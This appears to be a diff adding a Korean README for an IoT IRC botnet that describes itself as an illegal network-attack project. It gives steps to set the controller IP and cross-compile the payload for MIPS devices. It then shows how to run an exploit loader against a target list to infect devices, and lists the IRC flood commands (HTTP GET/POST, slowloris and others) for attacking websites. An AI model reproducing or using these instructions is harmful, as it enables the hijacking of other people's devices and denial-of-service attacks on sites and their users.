@@ -1,0 +1,20 @@
+해당 IRC 봇넷은 iOT 봇을 매개체로 사용하여 네트워크 공격을 가하는 불법적인 프로젝트 입니다.
+
+-페이로드 빌드
+1. main.go 아이피 변경
+2. set GOOS=linux set GOARCH=mipsle go build .
+
+-봇 로드
+1. cd sploit
+2. go build .
+3. type list.txt | ./iot auto
+
+mIRC와 같은 IRC 클라이언트로 기본(#test) 채널에 접속 하시고 사용하시면 됩니다.
+
+-공격 명령어
+.get 사이트링크 쓰레드 간격
+.post 사이트링크 쓰레드 간격
+.cfb 사이트링크 쓰레드 간격
+.slowloris 사이트링크 쓰레드 간격
+.geye 사이트링크 쓰레드 간격
+.kill 
